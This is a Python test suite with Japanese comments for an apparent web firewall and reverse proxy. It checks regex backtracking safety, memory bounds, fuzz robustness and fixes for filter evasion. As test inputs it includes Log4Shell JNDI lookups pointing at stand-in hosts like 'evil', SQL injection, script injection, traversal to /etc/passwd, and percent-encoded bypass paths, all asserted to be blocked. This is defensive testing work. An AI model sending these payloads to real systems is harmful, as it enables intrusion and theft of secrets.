"""
test_hardening.py — 完全性チェック: ReDoS/脆弱性・未知攻撃ファズ・資源境界・ホットパス健全性
====================================================================================
壊滅的バックトラッキング(自己DoS)が無いこと、乱数/不正入力で例外を出さないこと、ストリーム
生成がサイズ境界を守ること、ホットパスが妥当な時間で回ることを回帰から守る。時間境界は CI の
遅さでもフレークしないよう *緩め*(壊滅的=分単位だけを確実に捕える)。
"""
import tempfile
import time
import random

import dataplane.engine.lifeform.pipeline as P
from dataplane.engine.lifeform.pipeline import NetShield, _normalize_for_scan, _SIG_RE
from dataplane.engine.services.proxy import _framing_ambiguous
from dataplane.engine.lifeform import datasets as D

_BS = chr(92)
_PATHOLOGICAL = [
    "a" * 9000, "(" * 5000, "<" * 9000, "/" * 9000, "${" * 4000, "a/" * 4000,
    "%25" * 3000, ";" * 9000, "()" * 4000, "{{" * 4000, (_BS + "x") * 4000,
    "1=1" * 3000, "union" * 2000, "../" * 3000, "&lt;" * 2000, "%0a" * 4000,
]


def test_no_redos_on_pathological_inputs():
    # 各病的入力での 正規化+全シグネチャ+フレーミング検査 が 1 秒未満(壊滅的BTは分単位=確実に捕捉)。
    for p in _PATHOLOGICAL:
        t = time.perf_counter()
        b = _normalize_for_scan(p)
        for _n, rx in _SIG_RE:
            rx.search(b)
        _framing_ambiguous(("GET /" + p[:200] + " HTTP/1.1\r\nHost: x\r\n\r\n")
                           .encode("latin1", "replace"))
        assert time.perf_counter() - t < 1.0, p[:16]


def test_appeals_collection_is_memory_bounded():
    # 脆弱性修正(#36): 解除リクエスト(_appeals)は唯一上限が無く、多数IPからの申立で OOM し得た。
    # 上限超過で *解決済みを優先* に退避し審査待ちを温存、全pendingなら最古を退避=有界。
    old = P._APPEALS_MAX
    P._APPEALS_MAX = 5
    try:
        with tempfile.TemporaryDirectory() as tmp:
            sh = NetShield(state_dir=tmp); sh.enable()
            sh.cfg["appeal_after_sec"] = 0                # 待ち時間なしで申立可能に
            for i in range(20):                          # 上限(5)を大きく超える申立
                ip = f"203.0.113.{i + 1}"
                sh.inspect(ip, path="/.env")             # ハニーポット→即時BAN
                assert sh.submit_appeal(ip, "x" * 1000)["ok"]   # reason は[:500]で切詰
            assert len(sh._appeals) <= 5                  # メモリ有界(OOMしない)
            assert all(len(v["reason"]) <= 500 for v in sh._appeals.values())
    finally:
        P._APPEALS_MAX = old


def test_appeals_evict_resolved_before_pending():
    # 退避は解決済み(approved/denied)を優先=管理者の審査待ちを温存する。
    old = P._APPEALS_MAX
    P._APPEALS_MAX = 3
    try:
        with tempfile.TemporaryDirectory() as tmp:
            sh = NetShield(state_dir=tmp); sh.enable()
            sh.cfg["appeal_after_sec"] = 0
            for i in range(3):
                ip = f"198.51.100.{i + 1}"
                sh.inspect(ip, path="/.env"); sh.submit_appeal(ip, "r")
            sh.resolve_appeal("198.51.100.1", approve=False)   # 1件を解決済みに
            sh.inspect("198.51.100.9", path="/.env")
            sh.submit_appeal("198.51.100.9", "r")              # 4件目→解決済みが退避される
            assert "198.51.100.1" not in sh._appeals           # 解決済みが消えた
            assert "198.51.100.9" in sh._appeals               # 新しい審査待ちは残る
            assert len(sh._appeals) <= 3
    finally:
        P._APPEALS_MAX = old


def test_host_and_accept_headers_are_scanned():
    # 脆弱性修正(#41): Host ヘッダと Accept*/Accept-Language/Accept-Encoding は署名走査の死角で、
    # Host: ${jndi:...} や Accept-Language: ${jndi:...} が素通りしていた(バックエンドが記録→Log4Shell)。
    from dataplane.engine.services.proxy import _scan_header_values
    with tempfile.TemporaryDirectory() as tmp:
        sh = NetShield(state_dir=tmp); sh.enable(); sh.cfg["auto_under_attack"] = False
        # Host 経由の攻撃を検知(inspect の host フィールドを走査)
        assert sh.inspect("198.51.100.31", path="/", host="${jndi:ldap://e/x}")["action"] != "allow"
        assert sh.inspect("198.51.100.32", path="/", host="x' or 1=1--")["action"] != "allow"
        # Accept-Language 経由(プロキシ集約を模す)
        buf = b"GET / HTTP/1.1\r\nHost: ok\r\nAccept-Language: ${jndi:ldap://e/y}\r\n\r\n"
        assert "jndi" in _scan_header_values(buf)       # 集約に含まれる
        assert sh.inspect("198.51.100.33", path="/", host="ok",
                          headers=_scan_header_values(buf))["action"] != "allow"
        # 回帰: 通常の Host / Accept* は素通し(FPなし)
        bb = (b"GET / HTTP/1.1\r\nHost: shop.example\r\nAccept: text/html,*/*\r\n"
              b"Accept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, br\r\n\r\n")
        assert sh.inspect("198.51.100.34", path="/products", host="shop.example",
                          headers=_scan_header_values(bb))["action"] == "allow"


def test_percent_encoding_access_control_evasion_blocked():
    # 脆弱性修正(#40): blocked_urls/blocked_extensions/path_limits は path を小文字化のみで
    # %デコードせず=/%61dmin・/secret%2eenv・/%6cogin で回避できた(バックエンドは復号して提供)。
    with tempfile.TemporaryDirectory() as tmp:
        sh = NetShield(state_dir=tmp); sh.enable(); sh.cfg["auto_under_attack"] = False
        sh.cfg["blocked_urls"] = ["/admin"]; sh.cfg["blocked_extensions"] = [".env"]
        a = lambda ip, p: sh.inspect(ip, path=p)["action"]
        assert a("198.51.100.21", "/admin") == "block"
        assert a("198.51.100.22", "/%61dmin") == "block"          # %61=a → 復号して遮断
        assert a("198.51.100.23", "/secret.env") == "block"
        assert a("198.51.100.24", "/secret%2eenv") == "block"     # %2e=. → 復号して遮断
        assert a("198.51.100.25", "/products?id=5") == "allow"    # 回帰: 良性は素通し
        # path_limits(#21)も %デコード経路で回避不可
        sh.set_path_limits([{"path": "/login", "rate": 0.001, "burst": 1}])
        sh.inspect("198.51.100.26", path="/%6cogin")              # 1発目=消費
        assert sh.inspect("198.51.100.26", path="/%6cogin")["action"] == "throttle"


def test_scan_area_padding_evasion_is_blocked():
    # 脆弱性修正(#39): 走査面を1本に連結+8192切詰していたため、長大 path/query や先行ヘッダの
    # パディングでヘッダ内の payload(Log4Shell/SQLi)を走査外へ押し出して全署名を回避できた。
    # 各フィールド(path?query+UA / 各ヘッダ値)を独立走査することで封じる。
    with tempfile.TemporaryDirectory() as tmp:
        sh = NetShield(state_dir=tmp); sh.enable(); sh.cfg["auto_under_attack"] = False
        JND = "${jndi:ldap://evil/a}"
        a = lambda ip, **kw: sh.inspect(ip, **kw)["action"]
        assert a("203.0.113.71", path="/", query="x=1", headers=JND) != "allow"          # 基本検知
        assert a("203.0.113.72", path="/", query="a=" + "z" * 9000, headers=JND) != "allow"  # 長query回避×
        assert a("203.0.113.73", path="/" + "b" * 9000, headers="' or 1=1 --") != "allow"    # 長path回避×
        assert a("203.0.113.74", path="/",
                 headers=("X-Junk: " + "q" * 4000) + "\n" + JND) != "allow"               # 先行ヘッダ回避×
        assert a("203.0.113.75", path="/home", query="page=2",
                 headers="Mozilla/5.0\nReferer: https://ok.example") == "allow"           # 回帰: 良性は素通し


def test_active_ban_survives_eviction_pressure():
    # 脆弱性修正(#45): 攻撃者が多数IPで _ips を満杯にして自分のBAN状態を evict させると、次アクセスで
    # fresh state(ban_until=0=未BAN)化して実質 unban できた。_evict はアクティブBANを温存する。
    old = P._MAX_IPS; P._MAX_IPS = 12
    try:
        with tempfile.TemporaryDirectory() as tmp:
            sh = NetShield(state_dir=tmp); sh.enable(); sh.cfg["auto_under_attack"] = False
            bad = "203.0.113.7"
            sh.inspect(bad, path="/.env")                         # ハニーポット→即時BAN
            assert sh.is_banned_fast(bad)
            for i in range(80):                                   # 多数IPで _ips を満杯に(eviction誘発)
                sh.inspect(f"10.1.{i // 256}.{i % 256}", path="/home")
            assert sh.is_banned_fast(bad)                         # BAN は evict されず温存
            assert len(sh._ips) <= P._MAX_IPS + P._MAX_IPS // 10  # メモリ境界は維持
    finally:
        P._MAX_IPS = old


def test_clock_rewind_does_not_inflate_score_or_drain_tokens():
    # 堅牢性(#44): 時刻巻き戻し(NTP補正等)で score decay が反転してスコア膨張→誤BAN、
    # トークンバケツが負の経過で枯渇するのを防ぐ(経過 dt を 0 でクランプ=単調)。
    from dataplane.engine.lifeform.pipeline import _now
    with tempfile.TemporaryDirectory() as tmp:
        sh = NetShield(state_dir=tmp); sh.enable()
        st = sh._state("203.0.113.80")
        st["score"] = 50.0; st["score_ts"] = _now() + 100      # ts が未来=巻き戻し相当
        assert sh._decayed_score(st) <= 50.0                   # 膨張しない(≤ 元スコア)
        st["tokens"] = 5.0; st["refill"] = _now() + 100        # refill が未来
        sh._take_token(st)
        assert st["tokens"] >= 3.99                            # 負の経過で余計に枯渇しない(~4)


def test_traffic_map_is_memory_bounded():
    # 脆弱性修正(#43): quota の per-IP 窓集計 _traffic は _usage と違い IP数上限が無く、多数IPからの
    # トラフィックで無界増加(persist でファイルも肥大)していた。_MAX_IPS で古い順に間引き=有界。
    old = P._MAX_IPS
    P._MAX_IPS = 20
    try:
        with tempfile.TemporaryDirectory() as tmp:
            sh = NetShield(state_dir=tmp); sh.enable()
            sh.cfg["quota_enabled"] = True
            for i in range(200):
                sh.record_traffic(f"10.0.{i // 256}.{i % 256}", out_bytes=100)
            assert len(sh._traffic) <= 20
    finally:
        P._MAX_IPS = old


def test_alertsink_sources_set_is_bounded():
    # 脆弱性修正(#38): AlertSink._sources(distinct送信元IPのset)は唯一無界だった。
    # 多数の別IPからの記録(無認証ビーコン等)でも上限で飽和=メモリ有界。
    import dataplane.engine.lifeform.alerts as A
    old = A._SOURCES_MAX
    A._SOURCES_MAX = 10
    try:
        with tempfile.TemporaryDirectory() as tmp:
            sink = A.AlertSink("t", state_dir=tmp, dedup_window=0.0)
            for i in range(60):
                sink.record((f"k{i}", "hit"), {"client": f"10.0.{i // 256}.{i % 256}"},
                            verdict="malicious", action="alert")
            assert len(sink._sources) <= 10
    finally:
        A._SOURCES_MAX = old


def test_only_origin_form_target_accepted():
    # evolution #34: リバプロは origin-form(/path)のみ受理。絶対形/authority形は拒否=パス規則の回避防止。
    def fa(line):
        return _framing_ambiguous((line + "\r\nHost: x\r\n\r\n").encode("latin1"))
    assert fa("GET /login HTTP/1.1") is False                  # 正規 origin-form
    assert fa("OPTIONS * HTTP/1.1") is False                   # OPTIONS * は例外で許可
    assert fa("GET http://evil.com/.env HTTP/1.1") is True     # 絶対形=拒否
    assert fa("GET https://evil.com/login HTTP/1.1") is True   # 絶対形(https)=拒否
    assert fa("GET admin/x HTTP/1.1") is True                  # / 始まりでない=拒否
    assert fa("GET * HTTP/1.1") is True                        # OPTIONS 以外の * =拒否


def test_fuzz_entrypoints_no_crash():
    # 乱数/不正バイト列を主要入口へ。例外ゼロ・全体が有界時間で終わる(未知攻撃耐性)。
    with tempfile.TemporaryDirectory() as tmp:
        sh = NetShield(state_dir=tmp); sh.enable()
        rng = random.Random(31337)
        t0 = time.perf_counter()
        for _ in range(1500):
            raw = bytes(rng.getrandbits(8) for _ in range(rng.randint(0, 400)))
            _framing_ambiguous(raw)
            s = raw.decode("latin1", "replace")
            b = _normalize_for_scan(s)
            for _n, rx in _SIG_RE:
                rx.search(b)
            sh.inspect("9.9.9.9", path="/", query=s[:300], user_agent=s[:100])
        assert time.perf_counter() - t0 < 20.0


def test_stream_and_manifest_bounds_exact():
    # ハニーデータ生成が合計サイズ・ストリーム長を厳密に守る(資源の溢れ/枯渇なし)。
    for sz in (1, 1000, 65537, 500000):
        m = D.build_manifest(sz, seed=1)
        assert sum(f["size"] for f in m) == sz
        streamed = sum(len(c) for f in m for c in D.iter_content(f, chunk=4096))
        assert streamed == sz, (sz, streamed)


def test_hot_path_is_reasonably_fast():
    # ホットパス(inspect)が混在トラフィックで妥当な時間で回る(エラーゼロ)。緩い上限で非フレーク。
    with tempfile.TemporaryDirectory() as tmp:
        sh = NetShield(state_dir=tmp); sh.enable()
        corpus = ["/index.html", "?q=hello", "1 union select a from b", "<script>alert(1)",
                  "../../etc/passwd", "${jndi:ldap://e}", "/.env", "id[$ne]=1"]
        t0 = time.perf_counter()
        for i in range(3000):
            r = sh.inspect("203.0.113.%d" % (i % 254 + 1), path="/", query=corpus[i % len(corpus)])
            assert r.get("action") in ("allow", "throttle", "challenge", "block")
        assert time.perf_counter() - t0 < 10.0      # 3000 件 < 10s(実測は ~0.1s)
